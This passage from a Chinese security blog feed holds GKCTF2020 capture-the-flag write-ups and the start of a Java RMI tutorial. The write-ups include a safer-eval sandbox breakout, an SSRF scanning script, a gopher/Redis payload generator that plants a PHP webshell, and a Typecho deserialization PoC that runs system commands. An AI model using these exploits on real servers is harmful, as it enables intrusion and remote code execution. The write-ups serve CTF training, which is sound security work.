class=\"token string\">'/eval'</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">req<span class=\"token punctuation\">,</span> res</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>  <span class=\"token keyword\">let</span> response <span class=\"token operator\">=</span> <span class=\"token string\">''</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>req<span class=\"token punctuation\">.</span>body<span class=\"token punctuation\">.</span>e<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>    <span class=\"token keyword\">try</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>      response <span class=\"token operator\">=</span> <span class=\"token function\">saferEval</span><span class=\"token punctuation\">(</span>req<span class=\"token punctuation\">.</span>body<span class=\"token punctuation\">.</span>e<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>      response <span class=\"token operator\">=</span> <span class=\"token string\">'Wrong Wrong Wrong!!!!'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>  res<span class=\"token punctuation\">.</span><span class=\"token function\">send</span><span class=\"token punctuation\">(</span><span class=\"token function\">String</span><span class=\"token punctuation\">(</span>response<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre></pre></td></tr><tr><td data-num=\"50\"></td><td><pre><span class=\"token comment\">// 2019.10/WORKER1 老板娘说她要看到我们的源代码，用行数计算 KPI</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>app<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/source'</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">req<span class=\"token punctuation\">,</span> res</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>  res<span class=\"token punctuation\">.</span><span class=\"token function\">set</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Content-Type'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'text/javascript;charset=utf-8'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>  res<span class=\"token punctuation\">.</span><span class=\"token function\">send</span><span class=\"token punctuation\">(</span>fs<span class=\"token punctuation\">.</span><span class=\"token function\">readFileSync</span><span class=\"token punctuation\">(</span><span class=\"token string\">'./index.js'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre></pre></td></tr><tr><td data-num=\"56\"></td><td><pre><span class=\"token comment\">// 2019.12/WORKER3 为了方便我自己查看版本，加上这个接口</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>app<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/version'</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">req<span class=\"token punctuation\">,</span> res</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>  res<span class=\"token punctuation\">.</span><span class=\"token function\">set</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Content-Type'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'text/json;charset=utf-8'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>  res<span class=\"token punctuation\">.</span><span class=\"token function\">send</span><span class=\"token punctuation\">(</span>fs<span class=\"token punctuation\">.</span><span class=\"token function\">readFileSync</span><span class=\"token punctuation\">(</span><span class=\"token string\">'./package.json'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>app<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/'</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">req<span class=\"token punctuation\">,</span> res</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>  res<span class=\"token punctuation\">.</span><span class=\"token function\">set</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Content-Type'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'text/html;charset=utf-8'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>  res<span class=\"token punctuation\">.</span><span class=\"token function\">send</span><span class=\"token punctuation\">(</span>fs<span class=\"token punctuation\">.</span><span class=\"token function\">readFileSync</span><span class=\"token punctuation\">(</span><span class=\"token string\">'./index.html'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>app<span class=\"token punctuation\">.</span><span class=\"token function\">listen</span><span class=\"token punctuation\">(</span><span class=\"token number\">80</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'0.0.0.0'</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>  console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Start listening'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>后面的部分都在首页面给出了，题目的核心在两个 eval 路由上，先看第一个</p>\n<figure class=\"highlight js\"><figcaption data-lang=\"JavaScript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>app<span class=\"token punctuation\">.</span><span class=\"token function\">use</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">req<span class=\"token punctuation\">,</span> res<span class=\"token punctuation\">,</span> next</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  <span class=\"token comment\">// 如果请求路径为 '/eval'</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>req<span class=\"token punctuation\">.</span>path <span class=\"token operator\">===</span> <span class=\"token string\">'/eval'</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token comment\">// 设置延迟时间为 60 秒</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">let</span> delay <span class=\"token operator\">=</span> <span class=\"token number\">60</span> <span class=\"token operator\">*</span> <span class=\"token number\">1000</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>delay<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token comment\">// 如果请求参数中有 delay 参数，则将延迟时间设置为 delay 参数的值和当前延迟时间的最大值</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>Number<span class=\"token punctuation\">.</span><span class=\"token function\">isInteger</span><span class=\"token punctuation\">(</span><span class=\"token function\">parseInt</span><span class=\"token punctuation\">(</span>req<span class=\"token punctuation\">.</span>query<span class=\"token punctuation\">.</span>delay<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>      delay <span class=\"token operator\">=</span> Math<span class=\"token punctuation\">.</span><span class=\"token function\">max</span><span class=\"token punctuation\">(</span>delay<span class=\"token punctuation\">,</span> <span class=\"token function\">parseInt</span><span class=\"token punctuation\">(</span>req<span class=\"token punctuation\">.</span>query<span class=\"token punctuation\">.</span>delay<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token comment\">// 设置一个定时器，延迟时间到期后执行 next () 函数</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">const</span> t <span class=\"token operator\">=</span> <span class=\"token function\">setTimeout</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token function\">next</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> delay<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token comment\">// 2020.1/WORKER3 老板说让我优化一下速度，我就直接这样写了，其他人写了啥关我 p 事</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token comment\">// 如果延迟时间过长，设置一个 1 秒的定时器，到期后清除之前设置的定时器，并返回 'Timeout!' 字符串</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token function\">setTimeout</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>      <span class=\"token function\">clearTimeout</span><span class=\"token punctuation\">(</span>t<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>      console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">'timeout'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>      <span class=\"token keyword\">try</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        res<span class=\"token punctuation\">.</span><span class=\"token function\">send</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Timeout!'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>      <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>      <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token comment\">// 如果请求路径不为 '/eval'，则执行 next () 函数</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token function\">next</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>简答来说就是通过 <code>/eval?delay=</code>  上传一个数字并和 60000 比较，大的赋值给 delay</p>\n<pre><code class=\"language-perl\">浏览器内部使用32位带符号的整数来储存推迟执行的时间这意味着setTimeout最多延迟2147483647秒（24.8天）。只要大于2147483647,就会发生溢出\n</code></pre>\n<p>根据版本找到一个 cve<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2NvbW1lbnRob2wvc2FmZXItZXZhbC9pc3N1ZXMvMTA=\">Breakout · Issue #10 · commenthol/safer-eval (github.com)</span>，直接用就行</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051628984.png\" alt=\"image-20230405162804912\" /></p>\n<h3 id=\"ez三剑客-ezweb\"><a class=\"anchor\" href=\"#ez三剑客-ezweb\">#</a> EZ 三剑客 - EzWeb</h3>\n<p>看源码有一个 get 传参</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051629938.png\" alt=\"image-20230405162919887\" /></p>\n<p>访问</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051629926.png\" alt=\"image-20230405162928878\" /></p>\n<p>给了网卡信息，<span class=\"exturl\" data-url=\"aHR0cDovL3huLS13d3ctMHYxZWw1YmM3cGkwMmIwNzBkLmJhaWR1LmNvbQ==\">在前段输入 www.baidu.com</span>, 可以访问到这个页面。又是一个 ssrf</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051630056.png\" alt=\"image-20230405163052975\" /></p>\n<p>不让访问 127.0.0.1 但是可以使用真实 ip</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051636213.png\" alt=\"image-20230405163646133\" /></p>\n<p>尝试使用 file 读文件 file 协议被过滤了，尝试通过 file:/ 或者 file: // 去绕过</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051641155.png\" alt=\"image-20230405164131078\" /></p>\n<pre><code class=\"language-php\">&lt;?php\nfunction curl($url)&#123;  \n    $ch = curl_init();\n    curl_setopt($ch, CURLOPT_URL, $url);\n    curl_setopt($ch, CURLOPT_HEADER, 0);\n    echo curl_exec($ch);\n    curl_close($ch);\n&#125;\n\nif(isset($_GET['submit']))&#123;\n\t\t$url = $_GET['url'];\n\t\t//echo $url.&quot;\\n&quot;;\n\t\tif(preg_match('/file\\:\\/\\/|dict|\\.\\.\\/|127.0.0.1|localhost/is', $url,$match))\n\t\t&#123;\n\t\t\t//var_dump($match);\n\t\t\tdie('别这样');\n\t\t&#125;\n\t\tcurl($url);\n&#125;\nif(isset($_GET['secret']))&#123;\n\tsystem('ifconfig');\n&#125;\n?&gt;\n</code></pre>\n<p>过滤了 file://、dict、127.0.0.1、localhost，还能使用 gopher 协议和 http 协议</p>\n<p>先使用 http 服务探测存活主机，这里用 burp 的探测会卡住，简单的用 python 判断</p>\n<pre><code class=\"language-python\">import requests\nimport time\n\nurl = &quot;http://d3edfd3a-f06a-42ad-9bf4-fb994618272a.node4.buuoj.cn:81/index.php&quot;\nfor i in range(255):\n\tgetdata = &quot;?url=http://10.244.80.&quot;+str(i)+&quot;&amp;submit=%E6%8F%90%E4%BA%A4&quot;\n\turs_l = url + getdata\n\t# print(urs_l)\n\ttry:\n\t\tre = requests.get(urs_l,timeout=1)\n\t\tprint(re)\n\texcept requests.exceptions.RequestException:\n\t\tprint(&quot;失败   &quot;+str(i))\n\t\tpass\n\n\ttime.sleep(1)\n</code></pre>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051720575.png\" alt=\"image-20230405172033524\" /></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051720183.png\" alt=\"image-20230405172015095\" /></p>\n<p>接着扫描端口，6379 端口是开放的，有 redis 服务，gopher 打 ssrf，redis 的未授权访问漏洞，这里贴一下网上找到的 python2 的脚本这里改一下用 python3 跑</p>\n<pre><code class=\"language-python\"># 导入 quote 函数\nfrom urllib.parse import quote\n\n# 定义协议、IP、端口、要写入的 PHP 代码、文件名、路径、密码、命令列表\nprotocol = &quot;gopher://&quot;\nip = &quot;10.244.80.203&quot;\nport = &quot;6379&quot;\nshell = &quot;\\n\\n&lt;?php system(\\&quot;cat /flag\\&quot;);?&gt;\\n\\n&quot;\nfilename = &quot;1.php&quot;\npath = &quot;/var/www/html&quot;\npasswd = &quot;&quot;\ncmd = [&quot;flushall&quot;,  # 清空 Redis 数据库\n       &quot;set 1 &#123;&#125;&quot;.format(shell.replace(&quot; &quot;, &quot;$&#123;IFS&#125;&quot;)),  # 将 PHP 代码写入 Redis 中\n       &quot;config set dir &#123;&#125;&quot;.format(path),  # 设置 Redis 工作目录\n       &quot;config set dbfilename &#123;&#125;&quot;.format(filename),  # 设置 Redis 数据库文件名\n       &quot;save&quot;  # 将 Redis 数据库保存到磁盘中\n       ]\n\n# 如果设置了密码，将 AUTH 命令添加到命令列表中\nif passwd:\n    cmd.insert(0, &quot;AUTH &#123;&#125;&quot;.format(passwd))\n\n# 拼接 payload\npayload = protocol + ip + &quot;:&quot; + port + &quot;/_&quot;\n\n# 定义 redis_format 函数，将命令转换为 Redis 格式\ndef redis_format(arr):\n    CRLF = &quot;\\r\\n&quot;\n    redis_arr = arr.split(&quot; &quot;)\n    cmd = &quot;&quot;\n    cmd += &quot;*&quot; + str(len(redis_arr))\n    for x in redis_arr:\n        cmd += CRLF + &quot;$&quot; + str(len((x.replace(&quot;$&#123;IFS&#125;&quot;, &quot; &quot;)))) + CRLF + x.replace(&quot;$&#123;IFS&#125;&quot;, &quot; &quot;)\n    cmd += CRLF\n    return cmd\n\n# 将每个命令转换为 Redis 格式，并拼接到 payload 中\nif __name__ == &quot;__main__&quot;:\n    for x in cmd:\n        payload += quote(redis_format(x))\n    print(payload)\n#gopher://10.244.80.203:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2432%0D%0A%0A%0A%3C%3Fphp%20system%28%22cat%20/flag%22%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%245%0D%0A1.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A\n</code></pre>\n<p>访问木马文件就能拿到 flag</p>\n<h3 id=\"ez三剑客-eztypecho\"><a class=\"anchor\" href=\"#ez三剑客-eztypecho\">#</a> EZ 三剑客 - EzTypecho</h3>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051750723.png\" alt=\"image-20230405175019643\" /></p>\n<p>直接去找 Typecho 的 cve，看到是有反序列化漏洞的<span class=\"exturl\" data-url=\"aHR0cHM6Ly9wYXBlci5zZWVidWcub3JnLzQyNC8jMHgwMQ==\"> Typecho 前台 getshell 漏洞分析 (seebug.org)</span></p>\n<p>这个直接用网上的 poc 打就行</p>\n<pre><code class=\"language-php\">&lt;?php\nclass Typecho_Request\n&#123;\n    private $_params = array();\n    private $_filter = array();\n\n    public function __construct()\n    &#123;\n        $this-&gt;_params['screenName'] = 'ls /';\n        //$this-&gt;_params['screenName'] = -1;\n        $this-&gt;_filter[0] = 'system';\n    &#125;\n&#125;\n\nclass Typecho_Feed\n&#123;\n    const RSS2 = 'RSS 2.0';\n    /** 定义ATOM 1.0类型 */\n    const ATOM1 = 'ATOM 1.0';\n    /** 定义RSS时间格式 */\n    const DATE_RFC822 = 'r';\n    /** 定义ATOM时间格式 */\n    const DATE_W3CDTF = 'c';\n    /** 定义行结束符 */\n    const EOL = &quot;\\n&quot;;\n    private $_type;\n    private $_items = array();\n    public $dateFormat;\n\n    public function __construct()\n    &#123;\n        $this-&gt;_type = self::RSS2;\n        $item['link'] = '1';\n        $item['title'] = '2';\n        $item['date'] = 1507720298;\n        $item['author'] = new Typecho_Request();\n        $item['category'] = array(new Typecho_Request());\n\n        $this-&gt;_items[0] = $item;\n    &#125;\n&#125;\n\n$x = new Typecho_Feed();\n$a = array(\n    'host' =&gt; 'localhost',\n    'user' =&gt; 'xxxxxx',\n    'charset' =&gt; 'utf8',\n    'port' =&gt; '3306',\n    'database' =&gt; 'typecho',\n    'adapter' =&gt; $x,\n    'prefix' =&gt; 'typecho_'\n);\necho urlencode(base64_encode(serialize($a)));\n?&gt;\n</code></pre>\n",
            "tags": [
                "WP",
                "GKCTF2020"
            ]
        },
        {
            "id": "https://blog.xcu.icu/2023/04/01/%E8%BF%9C%E7%A8%8B%E6%96%B9%E6%B3%95%E8%B0%83%E7%94%A8(RMI)/",
            "url": "https://blog.xcu.icu/2023/04/01/%E8%BF%9C%E7%A8%8B%E6%96%B9%E6%B3%95%E8%B0%83%E7%94%A8(RMI)/",
            "title": "RMI浅记",
            "date_published": "2023-03-31T16:00:00.000Z",
            "content_html": "<h2 id=\"前言\"><a class=\"anchor\" href=\"#前言\">#</a> 前言</h2>\n<p>RMI (Remote Method Invocation) 远程方法调，是一种调用远程位置的对象来执行方法的思想，该模型是一种分布式对象应用，使用 RMI 技术可以使一个 JVM 中的对象，调用另一个 JVM 中的对象方法并获取调用结果。这里的另一个 JVM 可以在同一台计算机也可以是远程计算机。因此，RMI 意味着需要一个 Server 端和一个 Client 端。实际上就是在一个 java 虚拟机上调用另一个 java 虚拟机的对象上的方法  <code>RMI传输数据序列化后的数据</code> ，下图是 RMI 的架构在后面会详细的介绍到</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304070018728.png\" alt=\"image-20230407001809673\" /></p>\n<h2 id=\"rmi流程代码\"><a class=\"anchor\" href=\"#rmi流程代码\">#</a> RMI 流程（代码）</h2>\n<p>这里是参考 su18 师傅的文章通过分析源码来了解这个 RMI</p>\n<p>首先定义一个能够远程调用的接口，这个接口需要继承 Remote 接口，用来远程调用的对象作为这个接口的实例</p>\n<pre><code class=\"language-java\">package Clown_RMI_code;\n\nimport java.rmi.Remote;\nimport java.rmi.RemoteException;\n\npublic interface IRemoteHelloWorld extends Remote&#123;\n    public String hello() throws RemoteException;\n&#125;\n</code></pre>\n<p>接着实现这个接口，这里继承这个接口的同时通常需要扩展 java.rmi.server.UnicastRemoteObject 类，扩展此类后，RMI 会自动将这个类 export 给远程想要调用它的 Client 端，同时还提供了一些基础的 toString 方法，在 export 时会随机绑定一个端口，监听客户端的请求，直接请求这个端口也可以通行</p>\n<pre><code class=\"language-java\">package Clown_RMI_code;\n\nimport java.rmi.RemoteException;\nimport java.rmi.server.UnicastRemoteObject;\n\npublic class RemoteHelloWorld extends UnicastRemoteObject implements IRemoteHelloWorld &#123;\n    protected RemoteHelloWorld() throws RemoteException &#123;\n        super();\n    &#125;\n    public String hello() throws RemoteException &#123;\n        System.out.println(&quot;访问成功&quot;);\n        return &quot;Hello world&quot;;\n    &#125;\n&#125;\n</code></pre>\n<p>上面这个实现接口的类实际上就是能被远程调用的对象，对于调用方法 RMI 设计了一个 Registry 的思想，类似路由表的概念，实现这个主要通过 java.rmi.registry.Registry 和 java.rmi.Naming 来实现</p>\n<ol>\n<li>是 Java 远程方法调用（RMI）中的一个接口，提供了一个远程对象注册表。它用于将远程对象与名称绑定，然后可以使用该名称从远程客户端查找该对象。 <code>Registry</code>  接口定义了绑定（bind）、解绑（unbind）、列表（list）和查找（lookup）远程对象在注册表中的方法。</li>\n<li>是 Java 远程方法调用（RMI）中的一个类，提供了一个命名服务，用于在远程服务器上绑定和查找远程对象。它可以将一个远程对象绑定到一个 URL 地址上，这个 URL 地址可以被客户端用来查找该远程对象。<br />\n这是一个 final 方法，url 的格式 //host:post/name:\n<ol>\n<li>host，表示注册表所在的主机</li>\n<li>port 表示注册表接受调用的端口号，默认的是 1099</li>\n<li>name 表示一个注册 Remote Object 的引用的名称，不能是注册表中的一些关键词</li>\n</ol>\n</li>\n</ol>\n<p>使用  <code>LocateRegistry#createRegistry()</code>  方法来创建注册中心，将其加入到呆调用的类中进行绑定</p>\n<pre><code class=\"language-java\">package Clown_RMI_code;\n\nimport java.rmi.Naming;\nimport java.rmi.registry.LocateRegistry;\n\npublic class RemoteServer &#123;\n    public static void main(String[] args) throws Exception &#123;\n        LocateRegistry.createRegistry(1099);\n        //创建注册中心\n        IRemoteHelloWorld iRemoteHelloWorld = new RemoteHelloWorld();\n        //创建远程对象\n        Naming.bind(&quot;rmi://127.0.0.1/Hello&quot;,iRemoteHelloWorld);\n        //绑定\n    &#125;\n&#125;\n\n</code></pre>\n<p>最后就是在客户端进行调用</p>\n<pre><code class=\"language-java\">package Clown_RMI_code;\n\nimport java.rmi.NotBoundException;\nimport java.rmi.RemoteException;\nimport java.rmi.registry.LocateRegistry;\nimport java.rmi.registry.Registry;\nimport java.util.Arrays;\n\npublic class RMIClient &#123;\n    public static void main(String[] args) throws Exception, RemoteException, NotBoundException &#123;\n        // 获取 RMI 注册表，参数为 RMI 服务器的 IP 和端口号\n        Registry registry = LocateRegistry.getRegistry(&quot;192.168.32.6&quot;,1099);\n        // 打印出 RMI 注册表中所有已注册的服务名\n//        System.out.println(Arrays.toString(registry.list()));\n        // 根据服务名在 RMI 注册表中查找远程对象的 stub\n        IRemoteHelloWorld stub = (IRemoteHelloWorld) registry.lookup(&quot;Hello&quot;);\n        // 调用远程对象的方法并打印结果\n        System.out.println(stub.hello());\n    &#125;\n&#125;\n\n</code></pre>\n<p>在 RemoteServer 类中，创建注册中心后去创建了一个远程对象</p>\n<h3 id=\"注册中心的创建\"><a class=\"anchor\" href=\"#注册中心的创建\">#</a> 注册中心的创建</h3>\n<pre><code class=\"language-java\">LocateRegistry.createRegistry(1099);\n</code></pre>\n<p>这里首先跟进代码看到</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304070154150.png\" alt=\"image-20230407015432123\" /></p>\n<p>createRegistry 实际上 new 了 RegistryImpl 对象，继续跟进</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304070155087.png\" alt=\"image-20230407015543039\" /></p>\n<p>这段代码是 Java RMI 中  <code>RegistryImpl</code>  类的构造函数实现，用于创建 RMI 注册表。如果传入的  <code>port</code>  参数为默认的注册表端口  <code>Registry.REGISTRY_PORT</code> ，并且存在安全管理器，则授权注册表使用默认端口，并使用  <code>UnicastServerRef</code>  类导出远程对象，从而创建注册表的  <code>UnicastServerRef</code>  对象。否则，直接使用  <code>UnicastServerRef</code>  类导出远程对象，并创建注册表的  <code>UnicastServerRef</code>  对象。在导出远程对象时，使用  <code>LiveRef</code>  类来表示远程对象的引用，同时使用  <code>RegistryImpl::registryFilter</code>  方法来过滤注册表的传输流。</p>\n<h3 id=\"远程对象创建\"><a class=\"anchor\" href=\"#远程对象创建\">#</a> 远程对象创建</h3>\n<p>这个对象是继承了 UnicastRemoteObject，前面也有提到这个类会自动 export 远程，并获取 Stub，Stub 是一个代理类</p>\n<p>首先这里会调用的静态方法 exportObject</p>\n<p>它是 <code>java.rmi.server.RemoteObject</code>  类中的一个静态方法。它用于导出远程对象并返回一个存根，该存根可用于调用远程对象上的方法。</p>\n<p>该方法有两个参数：要导出的  <code>Remote</code>  对象和一个  <code>UnicastServerRef</code>  对象。如果要导出的对象继承了  <code>UnicastRemoteObject</code>  类，那么该方法将设置它的  <code>ref</code>  字段。最后，该方法会调用  <code>sref.exportObject(obj, null, false)</code>  方法导出远程对象，并返回导出的远程对象的存根。</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304070102824.png\" alt=\"image-20230407010207778\" /></p>\n<p>对 RemoteHelloWorld 的 exprot 的创建主要是通过 createprot 方法使用 RemoteObjectInvocationHandler 来为我们测试写的 RemoteObject 实现的 RemoteInterface 